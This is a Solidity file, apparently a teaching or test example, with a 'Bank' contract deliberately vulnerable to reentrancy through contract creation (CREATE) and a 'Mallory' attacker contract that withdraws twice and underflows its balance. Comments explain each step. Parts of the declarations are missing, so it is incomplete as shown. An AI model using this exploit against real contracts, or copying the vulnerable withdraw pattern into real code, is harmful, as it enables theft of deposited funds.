pragma solidity ^0.5;

contract Intermediary {
    address owner;
    Bank bank;
    uint amount;

    // for solidity 0.4.21
    constructor (Bank _bank, address _owner, uint _amount) public {
        owner = _owner;
        bank = _bank;
        amount = _amount;
        IntermediaryCallback(_owner).registerIntermediary(address(this));
    }
}

contract Mallory is IntermediaryCallback {
    Bank bank;
    uint state;
    Intermediary i1;
    Intermediary i2;

    function attack(Bank b, uint amount) public payable {
        state = 0;
        bank = b;
        // first deposit some ether
        bank.deposit.value(amount)();
        // then withdraw it again. This will create a new Intermediary contract, which
        // holds the funds until we retrieve it. This will trigger the
        // registerIntermediary callback.
        bank.withdraw(bank.getBalance(address(this)));
        // finally withdraw all the funds from our Intermediarys
        i1.withdraw();
        i2.withdraw();

        // note that bank.balances[this] has underflowed by now, so we will see
        // also a huge balances entry for the Mallory contract.
    }

    // for solidity 0.4.21
    function registerIntermediary(address what) public payable {
        // called by the newly created Intermediary contracts
        if (state == 0) {
            // we do not want to loop the re-entrancy until we run out of gas,
            // so we stop after the second withdrawal
            state = 1;
            // we keep track of the Intermediary, because it holds our funds
            i1 = Intermediary(what);
            // withdraw again - note that `bank.balances[this]` was not yet
            // updated.
            bank.withdraw(bank.getBalance(address(this)));
        } else if (state == 1) {
            state = 2;
            // this is the second Intermediary that holds funds for us
            i2 = Intermediary(what);
        } else {
            // ignore everything else
        }
    }    
}

contract Bank {
    function withdraw(uint amount) public {
        if (balances[msg.sender] >= amount) {
            // The new keyword creates a new contract (in this case of type
            // Intermediary). This is implemented on the EVM level with the CREATE
            // instruction. CREATE immediately runs the constructor of the
            // contract. i.e this must be seen as an external call to another
            // contract.
            // Even though the contract can be considered "trusted", it can
            // perform further problematic actions (e.g. more external calls)
            subs[msg.sender] = new Intermediary(this, msg.sender, amount);
            // state update **after** the CREATE
            balances[msg.sender] -= amount;
            address(subs[msg.sender]).transfer(amount);
        }
    }
}

